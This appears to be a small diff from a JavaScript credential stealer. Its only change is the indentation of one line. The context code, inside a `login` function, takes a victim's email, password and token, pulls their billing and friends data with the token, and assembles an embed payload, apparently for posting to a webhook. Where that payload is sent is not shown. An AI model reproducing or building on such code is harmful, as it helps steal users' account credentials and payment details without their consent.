@@ -603,7 +603,7 @@ const login = async (email, password, token) => {
   const billing = await getBilling(token);
   const friends = await getFriends(token);
   const content = {
-    username: config.embed_name,
+      username: config.embed_name,
     avatar_url: config.embed_icon,
     embeds: [
       {
